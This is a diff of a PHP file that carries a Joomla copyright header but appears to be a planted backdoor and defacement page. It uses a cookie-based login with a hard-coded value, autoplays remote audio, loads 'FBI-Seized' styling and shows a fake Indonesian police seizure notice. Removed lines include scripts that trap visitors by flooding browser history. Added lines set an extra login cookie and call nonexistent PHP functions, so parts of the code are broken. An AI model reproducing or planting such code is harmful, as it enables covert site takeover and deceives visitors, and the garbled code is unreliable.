@@ -25,8 +25,29 @@
  * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
  *
  */
-
 // @deprecated  1.0  Deprecated without replacement
+// Toggle this to change the setting
+define('DEBUG', true);
+
+// You want all errors to be triggered
+error_reporting(E_ALL);
+
+if(DEBUG == true)
+{
+    // You're developing, so you want all errors to be shown
+    display_errors(true);
+
+    // Logging is usually overkill during development
+    log_errors(false);
+}
+else
+{
+    // You don't want to display errors on a production environment
+    display_errors(false);
+
+    // You definitely want to log any occurring
+    log_errors(true);
+}
 function is_logged_in()
 {
     return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'LPH'; 
@@ -91,8 +112,8 @@ echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" ty
  // https://bcrypt.online/
         
         if (password_verify($entered_key, $hashed_key)) {
-            setcookie('user_id', 'LPH', time() + 25200, '/'); 
-                   
+            setcookie('user_id', 'LPH', time() + 25200, '/');
+               setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200);    
 		exit();
         }
     }
@@ -107,28 +128,6 @@ echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" ty
         @import 'https://rawcdn.githack.com/DanteLorenzo/FBI-Seized/495d2d737d64738e513519283eb444a9caefba89/src/css/main.css?min=1';
     </style>
 </head>
-
-<script type="text/JavaScript">
-
-     function disableselect(e) {
-          return false
-        }
-        
-        function reEnable() {
-          return true
-        }
-        
-        document.onselectstart = new Function ("return false")
-        
-        if (window.sidebar) {
-          document.onmousedown = disableselect
-          document.onclick = reEnable
-        }
-        </script>
-        
-
-<body>
-        
 
 <script type="text/JavaScript">
 
@@ -197,16 +196,9 @@ Sesuai Dengan Surat Perintah Penyitaan<br>Nomor : SP / 18 / III / 2024
             </form>
         </div>
 
-           </div>
+           
 
-<script>
-function ClearError() {return true;}window.onerror = ClearError;
-	 (function () {
-	 for(var i = 0; i < 20; i++) {
-	 history.pushState(null, document.title, window.location.href );
-	 }
-	 })(document, window, history);
-</script>
+
 
         <script>
             function createSnowflake() {
